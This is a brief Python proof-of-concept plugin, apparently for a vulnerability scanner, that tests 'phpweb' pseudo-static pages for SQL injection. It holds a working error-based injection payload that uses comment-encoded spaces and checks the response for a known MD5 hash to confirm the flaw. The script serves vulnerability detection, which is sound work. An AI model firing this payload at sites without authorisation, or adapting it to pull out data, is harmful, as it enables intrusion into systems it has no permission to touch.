#!/usr/bin/env python
# -*- coding: utf-8 -*-

"""
POC Name  :  phpweb伪静态页面注入
References:  http://www.myhack58.com/Article/html/3/62/2013/36562.htm
Author    :  13
QQ        :  779408317
"""

def assign(service, arg):
    if service == "phpweb":
        return True, arg

def audit(arg):
    payload = "page/html/?56'/**/and/**/(SELECT/**/1/**/from/**/(select/**/count(*),concat(floor(rand(0)*2),(substring((select(md5(3.1415))),1,62)))a/**/from/**/information_schema.tables/**/group/**/by/**/a)b)=1/*.html"
    url = arg + payload
    code, head, res, errcode, _ = curl.curl('"%s"' % url)
    if code ==200 and "63e1f04640e83605c1d177544a5a0488" in res:
        security_hole(url)

if __name__ == '__main__':
    from dummy import *
    audit(assign('phpweb', 'http://www.example.com/')[1])